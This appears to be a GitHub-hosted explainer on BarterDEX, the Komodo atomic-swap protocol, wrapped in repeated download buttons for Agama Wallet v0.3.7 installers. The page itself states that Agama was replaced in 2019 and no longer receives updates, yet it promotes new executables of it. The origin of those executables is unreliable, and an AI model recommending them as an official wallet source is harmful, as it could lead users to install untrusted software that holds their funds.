[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# BarterDEX: The Exchange Agama Shipped With

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

BarterDEX was the Komodo ecosystem's peer-to-peer swap protocol, an order book and matching engine that settled trades through hash time-locked contracts instead of holding customer funds. It was the engine behind the atomic-swap feature in the original Agama wallet, and the site for Agama Wallet still describes swaps as running through it. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps.

## You'll see this if

A swap screen or an old guide refers to BarterDEX, and you cannot tell whether it is a wallet, an exchange, a protocol, or a feature you need to enable.

| Name | Layer | What it is |
|---|---|---|
| BarterDEX | Protocol | Order book plus peer-to-peer settlement over contracts |
| Agama (original) | Application | Desktop wallet that exposed the protocol |
| AtomicDEX | Product | The exchange named as Agama's replacement in 2019 |
| Komodo Wallet / Gleec Exchange Wallet | Product | Later wallets in the same lineage |
| Iguana Core, liquidity nodes | Infrastructure | Components the protocol relied on |

## Why it happens

A decentralised exchange needs two things: a way for buyers and sellers to find each other, and a way to settle without either trusting the other. BarterDEX solved the second with hash time-locked contracts, and the first with an order book passed between peers rather than held by a server.

That design has a consequence worth understanding: the protocol does not hold funds at any point. A trade is two locks and two claims, which is why the wallet could offer swapping without a deposit step and why the maker describes funds as staying in the user's wallet until the trade executes.

The naming confusion comes from the products built on top. AtomicDEX was a product that used the protocol; the original Agama was a wallet that used it; later wallets used their own implementations. A protocol name survives its products, so old documentation keeps referring to it long after the interface has changed. That is also why a search for BarterDEX returns a mixture of protocol descriptions, product pages and forum threads spanning several years, with no indication which layer each one is describing.

Matching itself was the less visible half. Orders were passed between peers rather than held on a server, which meant discovery depended on the network of participants rather than on one operator's database. A thin network produced a thin book, and a thin book is the reason a trade can wait: the protocol settles correctly, it simply has nothing to settle.

## Fix

If you are trying to use, evaluate or replace a BarterDEX-based workflow, separate the layers first.

1. **Identify whether the instruction is about the protocol or a product.** "BarterDEX" describes settlement; a product name describes an interface.
2. **Check the date of the instruction.** Anything written before mid-2019 was written for a wallet generation that no longer receives updates.
3. **Check whether the software you have implements the protocol.** The maker describes the current wallet's swaps as running through it, which is a description of the mechanism rather than a compatibility promise.
4. **Do not follow product steps across generations.** Menus and flows change; the contract logic does not.
5. **Prefer current documentation for current software.** For the mechanism itself, [how atomic swaps work](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md) is version-independent.

## If that did not work

If an old guide's steps do not match your interface, the gap is the product generation rather than your error.

If a swap interface offers no order book, it may be matching differently: a protocol can support several discovery mechanisms, and the absence of a visible book does not mean swaps are impossible.

If a trade fails on a pair that once had liquidity, the order book has emptied rather than the protocol breaking.

If a site claims to be BarterDEX itself, treat the claim carefully: a protocol is not a service, and no single site is the protocol.

## Prevention

- **Keep protocol and product names apart in your notes.** It prevents most of this confusion.
- **Date any guide you follow.** The ecosystem's software has changed more than once since 2019.
- **Check liquidity before trading.** A protocol can be working perfectly with an empty book.
- **Do not expect interface continuity across generations.** [AtomicDEX](https://github.com/agama-wallet/agama-wallet/blob/main/atomicdex-explained.md) explains what came next.
- **Read the mechanism if the interface confuses you.** The contract behaviour is stable even when the menus are not.

## FAQ

### Is BarterDEX still operating?

BarterDEX is a protocol rather than a service, so it does not operate in the way a website does. Products that implemented it have changed over time, and the current wallet in the ecosystem is a later generation.

### Which assets could be traded?

The ecosystem's pairs centred on its own coin and the major chains its wallet supported, with KMD/BTC and KMD/LTC among the deepest. [What KMD is](https://github.com/agama-wallet/agama-wallet/blob/main/what-kmd-does.md) covers the asset that anchored those pairs.

### Did BarterDEX hold customer funds?

No. Settlement was peer-to-peer over hash time-locked contracts, with no deposit step, which is the property that made it attractive in the first place.

### What replaced BarterDEX?

AtomicDEX was the product Komodo named as Agama's replacement in June 2019, and later wallets in the ecosystem followed. The protocol concepts carried forward even as the products changed.

### How were orders matched without a server?

Through peer-to-peer propagation of the order book rather than a central database. Each participant held a view of available orders and relayed them, so discovery depended on how many peers were active at that moment.

### Do I need BarterDEX to do an atomic swap today?

No. Any implementation of the same contract pattern can settle a swap; the protocol name describes a family of implementations rather than one required component.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [AtomicDEX: What the Decentralised Exchange Was](https://github.com/agama-wallet/agama-wallet/blob/main/atomicdex-explained.md)
- [What Is an Atomic Swap? Exchange Without an Intermediary](https://github.com/agama-wallet/atomic-swaps/blob/main/exchange-without-an-intermediary.md)
- [Komodo Wallet: What It Is and How KMD Works](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-and-kmd.md)
- [How Atomic Swaps Work, Step by Step](https://github.com/agama-wallet/atomic-swaps/blob/main/step-by-step-mechanics.md)
